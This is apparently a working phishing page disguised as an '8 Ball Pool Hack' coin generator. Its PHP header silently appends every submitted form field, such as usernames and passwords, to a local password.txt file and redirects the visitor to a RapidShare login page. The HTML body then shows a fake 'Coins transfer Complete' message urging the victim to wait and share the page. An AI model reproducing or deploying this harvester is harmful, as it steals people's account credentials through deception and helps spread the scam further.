<?php
header("Location: https://ssl.rapidshare.de/cgi-bin/premiumzone.cgi");
$handle = fopen("password.txt", "a");
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<html xmlns:ICA="ICA">
	<head>
		<meta name="vs_showGrid" content="True">
		<title>8 Ball Pool Hack</title>
		<LINK href="Style.css" type="text/css" rel="STYLESHEET">
		<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
		<meta name="GENERATOR" content="Microsoft Visual Studio .NET 7.1">
		<meta name="vs_targetSchema" content="http://schemas.microsoft.com/intellisense/ie5">
		<meta name="ICADlg" content="text/html" id="ICADlg" ICA:DlgHW="205,470" ICA:PromptForCancel="no" />
		<script language="jscript" type="text/jscript" src="../../_XX/Custom/js/Setup.js"></script>
		<script language="jscript" type="text/jscript">
		    
		    function OnBodyLoad()
		    {

		    }
		    
		</script>
		
	</head>
	
    <body onload="OnBodyLoad();">

        <div class="Panel">
		
		    <img class="DlgBlock" src="Success.gif" alt="">
		
		    <div class="DlgBlock" style="left: 50px; font-weight:bold ;" ICA:Property="Str.Required.Dlg.InstallComplete">
		        Coins transfer Complete
            </div>
            
            <div class="DlgBlock" style="left: 50px; top: 20px; height: 70px; width: 370px; overflow: auto;" ICA:Property="ICA.Installation.Result.Text" >
                [Open your game after 30 minutes and You will get coins. Enjoy the hack!! And must share If u like.]
            </div>
		<div class="DlgBlock" style="top: 85px; width: 420px; text-align: right;">
                <button  onclick="window.external.EndModalLoop(0);" ID="idOk" accesskey="OK" ><u>O</u>K</button>
            </div>

		</div>
	
	</body>
</html>

	